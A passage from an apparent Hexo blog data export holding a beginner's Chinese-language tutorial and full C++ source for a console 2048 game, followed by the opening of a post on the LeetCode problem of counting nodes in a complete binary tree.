input;</span><br><span class=\"line\">    srand((unsigned)time(NULL));</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"string\">\"Please input the path of the configuration file:\"</span> &lt;&lt; endl;</span><br><span class=\"line\">    cin &gt;&gt; inputFile;</span><br><span class=\"line\">    ifstream file(inputFile);</span><br><span class=\"line\">    memset(<span class=\"built_in\">Map</span>,<span class=\"number\">0</span>,NUM * NUM * sizeof(<span class=\"built_in\">int</span>));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file == NULL)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">Map</span>[NUM - <span class=\"number\">1</span>][NUM - <span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">\"Configuration file not found, the map are initialed as the default one\"</span> &lt;&lt; endl;</span><br><span class=\"line\">        output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">4</span>;++ i)</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; <span class=\"number\">4</span>;++ j)</span><br><span class=\"line\">                file &gt;&gt; <span class=\"built_in\">Map</span>[i][j];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!init(<span class=\"built_in\">Map</span>,<span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">            output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">            cout &lt;&lt; <span class=\"string\">\"Game over!\"</span> &lt;&lt; endl;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">\"The map are initialed\"</span> &lt;&lt; endl;</span><br><span class=\"line\">        output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">do</span>&#123;</span><br><span class=\"line\">        cin &gt;&gt; input;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">while</span>(execute(<span class=\"built_in\">Map</span>,input));</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>俗气的2048<br>","more":"<br><strong>新手教学向，没有任何优化和程序设计在里边</strong><br>整个程序设计是这样的。首先读入文件。然后用execute()函数控制整个运算流程。按键按下后，首先调用trans()函数把所有的字符向该方向移动紧密，然后调用addup()函数把临近相同的处理掉，然后调用trans()函数把处理后的向同一个方向移动。<br>init()函数是这样的，如果type是1，那么在判定是不是可以继续游戏之后要在是0的位置随机生成2，如果type是0，那么直判定是不是可以继续。<br>init()其中的随机生成写的比较难懂，可以仔细分析一下就不难明白了。<br><figure class=\"highlight dart\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;time.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#define NUM <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * output </span>the<span class=\"markdown\"> Map</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> output(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM])&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">            cout &lt;&lt; <span class=\"built_in\">Map</span>[i][j] &lt;&lt; <span class=\"string\">'\\t'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        cout &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * Transfer every cell to </span>the<span class=\"markdown\"> right direction</span><br><span class=\"line\"> * @para Map:The Map</span><br><span class=\"line\"> *       type: The direction</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"><span class=\"keyword\">void</span> trans(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM], char type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,k;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'w'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM - <span class=\"number\">1</span>;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span>(k = i + <span class=\"number\">1</span>;k &lt; NUM;++ k)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[k][j])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[k][j];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[k][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = NUM;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'d'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = NUM - <span class=\"number\">1</span>;j &gt; <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(k = j - <span class=\"number\">1</span>;k &gt;= <span class=\"number\">0</span>;-- k)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j])&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][k])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[i][k];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][k] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = <span class=\"number\">-1</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'s'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = NUM - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span>(k = i - <span class=\"number\">1</span>;k &gt;= <span class=\"number\">0</span>;-- k)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[k][j])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[k][j];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[k][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = <span class=\"number\">-1</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'a'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM - <span class=\"number\">1</span>;++ j)</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j])&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span>(k = j + <span class=\"number\">1</span>;k &lt; NUM;++ k)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][k])&#123;</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][j] = <span class=\"built_in\">Map</span>[i][k];</span><br><span class=\"line\">                            <span class=\"built_in\">Map</span>[i][k] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                            k = NUM;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * get new cell</span><br><span class=\"line\"> * @para Map:The Map</span><br><span class=\"line\"> *       type:</span><br><span class=\"line\"> *            1 : check </span>the<span class=\"markdown\"> Map and add </span>a<span class=\"markdown\"> new cell</span><br><span class=\"line\"> *            0 : only check </span>the<span class=\"markdown\"> Map</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"><span class=\"built_in\">bool</span> init(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM], <span class=\"built_in\">int</span> type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> flag[NUM * NUM];</span><br><span class=\"line\">    memset(flag,<span class=\"number\">0</span>,sizeof(flag));</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!<span class=\"built_in\">Map</span>[i][j]) flag[cnt ++] = i * <span class=\"number\">4</span> + j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!type) <span class=\"keyword\">return</span> cnt;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(cnt)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">int</span> rnd = rand() % cnt;</span><br><span class=\"line\">        rnd = flag[rnd];</span><br><span class=\"line\">        <span class=\"built_in\">Map</span>[rnd / <span class=\"number\">4</span>][rnd % <span class=\"number\">4</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"><span class=\"markdown\">/<span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*</span><br><span class=\"line\"> * if </span>a<span class=\"markdown\"> cell is equal to </span>the<span class=\"markdown\"> next one, add up them</span><br><span class=\"line\"> * @para Map:The Map</span><br><span class=\"line\"> *       type: </span>the<span class=\"markdown\"> direction</span><br><span class=\"line\"> <span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"strong\">*****</span><span class=\"emphasis\">***</span>*/</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> addup(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM],char type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,dir;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type == <span class=\"string\">'a'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM - <span class=\"number\">1</span>;++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i][j + <span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j + <span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type == <span class=\"string\">'w'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; NUM - <span class=\"number\">1</span>;++ i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; NUM;++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i + <span class=\"number\">1</span>][j])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i + <span class=\"number\">1</span>][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type == <span class=\"string\">'d'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = NUM - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = NUM - <span class=\"number\">1</span>;j &gt; <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i][j - <span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j - <span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type == <span class=\"string\">'s'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = NUM - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = NUM - <span class=\"number\">1</span>;j &gt;= <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"built_in\">Map</span>[i][j] == <span class=\"built_in\">Map</span>[i - <span class=\"number\">1</span>][j])&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i][j] &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">Map</span>[i - <span class=\"number\">1</span>][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">bool</span> execute(<span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM],char type)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j,k;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(type != <span class=\"string\">'w'</span> &amp;&amp; type != <span class=\"string\">'s'</span> &amp;&amp; type != <span class=\"string\">'a'</span> &amp;&amp; type != <span class=\"string\">'d'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(type == <span class=\"number\">10</span>) ;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> printf(<span class=\"string\">\"Input error\\n\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    trans(<span class=\"built_in\">Map</span>,type);</span><br><span class=\"line\"></span><br><span class=\"line\">    addup(<span class=\"built_in\">Map</span>,type);</span><br><span class=\"line\"></span><br><span class=\"line\">    trans(<span class=\"built_in\">Map</span>,type);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(init(<span class=\"built_in\">Map</span>,<span class=\"number\">1</span>))&#123;</span><br><span class=\"line\">        output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"Game over\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i,j;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> <span class=\"built_in\">Map</span>[NUM][NUM];</span><br><span class=\"line\">    char inputFile[<span class=\"number\">20</span>];</span><br><span class=\"line\">    char input;</span><br><span class=\"line\">    srand((unsigned)time(NULL));</span><br><span class=\"line\">    cout &lt;&lt; <span class=\"string\">\"Please input the path of the configuration file:\"</span> &lt;&lt; endl;</span><br><span class=\"line\">    cin &gt;&gt; inputFile;</span><br><span class=\"line\">    ifstream file(inputFile);</span><br><span class=\"line\">    memset(<span class=\"built_in\">Map</span>,<span class=\"number\">0</span>,NUM * NUM * sizeof(<span class=\"built_in\">int</span>));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file == NULL)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">Map</span>[NUM - <span class=\"number\">1</span>][NUM - <span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">\"Configuration file not found, the map are initialed as the default one\"</span> &lt;&lt; endl;</span><br><span class=\"line\">        output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">4</span>;++ i)</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>;j &lt; <span class=\"number\">4</span>;++ j)</span><br><span class=\"line\">                file &gt;&gt; <span class=\"built_in\">Map</span>[i][j];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!init(<span class=\"built_in\">Map</span>,<span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">            output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">            cout &lt;&lt; <span class=\"string\">\"Game over!\"</span> &lt;&lt; endl;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">\"The map are initialed\"</span> &lt;&lt; endl;</span><br><span class=\"line\">        output(<span class=\"built_in\">Map</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">do</span>&#123;</span><br><span class=\"line\">        cin &gt;&gt; input;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">while</span>(execute(<span class=\"built_in\">Map</span>,input));</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Count Complete Tree Nodes","date":"2015-06-07T15:39:28.000Z","_content":"Given a complete binary tree, count the number of nodes.\n<!--more-->\n水题嘛~给一颗完全二叉树（误？），让统计一下一共有多少节点。\n这个题目不知道暴力遍历会不会过。按照leetcode的尿性是没问题的吧~只不过要快点的话还是二分\n##二叉树的问题##\n总之一个满二叉树，总会有一些奇怪的性质。比方说下边这个图的标号：\n![完全二叉树](/image/20150607154352.png)\n这个图就是个完全二叉树，我们可以看到什么呢？\n**父子节点标号关系**\n首先来说，一个节点的标号的左右孩子节点的标号是多少呢？如果这个节点是x,左孩子就是x * 2,右孩子就是x * 2 + 